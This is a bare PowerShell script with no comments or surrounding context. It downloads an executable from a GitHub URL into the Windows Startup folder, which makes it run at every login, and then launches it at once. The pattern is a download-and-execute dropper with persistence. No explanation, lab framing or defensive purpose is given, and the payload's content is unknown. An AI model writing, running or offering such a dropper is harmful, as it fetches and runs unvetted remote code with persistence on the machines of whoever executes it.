[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$down = New-Object System.Net.WebClient
$url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
$file = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AW_prod.exe"
$down.DownloadFile($url,$file)
$exec = New-Object -com shell.application
$exec.shellexecute($file)
